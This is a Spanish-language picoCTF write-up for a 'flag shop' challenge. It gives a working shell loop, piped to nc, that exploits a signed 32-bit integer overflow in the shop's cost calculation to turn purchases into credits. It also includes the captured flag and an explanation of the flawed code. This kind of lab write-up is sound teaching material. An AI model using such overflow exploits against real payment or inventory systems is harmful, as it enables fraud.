**Challenge**
	
**Description**
	There's a flag shop selling stuff, can you buy a flag?
	[Source](https://challenge-files.picoctf.net/c_fickle_tempest/66a0d80bfdedc5f74bdd52c50da2e5d7bf40c5634fd456b103ac74c006bf45e4/store.c). Connect with nc fickle-tempest.picoctf.net 58057.
	**Hints**
		1. Two's compliment can do some weird things when numbers get really big!

**Solution**
	1. Usando terminal de picoCTF, ejecutndo el codigo fuente [[Archivos 03/store.c]]
		Enter a menu selection
		Currently for sale
		1. Defintely not the flag Flag
		2. 1337 Flag
		1337 flags cost 100000 dollars, and we only have 1 in stock
		Enter 1 to buy oneYOUR FLAG IS: picoCTF{m0n3y_bag5_39AF2bE1}
		
		Welcome to the flag exchange
		We sell flags
		
		1. Check Account Balance
		
		2. Buy Flags
		
		3. Exit
		
		 Enter a menu selection
/
	2. Código usado
		(for i in $(seq 1 120); do
			echo 2            # Menú: Buy Flags
			echo 1            # Opción: Flag barata (knockoff)
			echo 2147483647   # Cantidad grande → provoca overflow
		done
		echo 2                # Menú: Buy Flags
		echo 2                # Opción: Flag real (1337 Flag)
		echo 1                # Confirmar compra
		) | nc fickle-tempest.picoctf.net 58057
	3. Bandera: `picoCTF{m0n3y_bag5_39AF2bE1}`

**Notes**
	El problema está en esta parte del código:
		`int total_cost = 0; `
		`total_cost = 900 * number_flags;`
		Aquí `total_cost` es un `int`. Eso significa que tiene un límite (32 bits).
	Cuando metes un número muy grande como `2147483647`, la multiplicación:
		`900 * number_flags`
		supera ese límite y ocurre un **overflow**.
	Por eso el resultado no es correcto y se vuelve negativo:
		The final cost is: -900
	Luego pasa esto en el código:
		`if(total_cost <= account_balance){  ``
		    `account_balance = account_balance - total_cost;  `
		`}`
	Aquí está la clave:
		- `total_cost` es negativo
		- Entonces la operación queda así:
			`account_balance = account_balance - (-900);`
	Lo cual en realidad es:
		`account_balance = account_balance + 900;`
		Osea, el programa **te da dinero en lugar de quitártelo**.
	Por eso el ataque funciona así:
		1. Compras el item barato
		2. Metes un número grande (`2147483647`)
		3. El costo sale negativo
		4. Tu dinero aumenta
		5. Repites varias veces
	Finalmente, esta parte:
		`if(account_balance > 100000){  
		    // imprime la flag  
		}`
		Cuando ya tienes suficiente dinero, el programa entra aquí y te da la flag.
	**Idea clave final:**  
		El error está en que el programa no controla el overflow en `900 * number_flags`, y eso permite convertir un gasto en ganancia.

**References**
	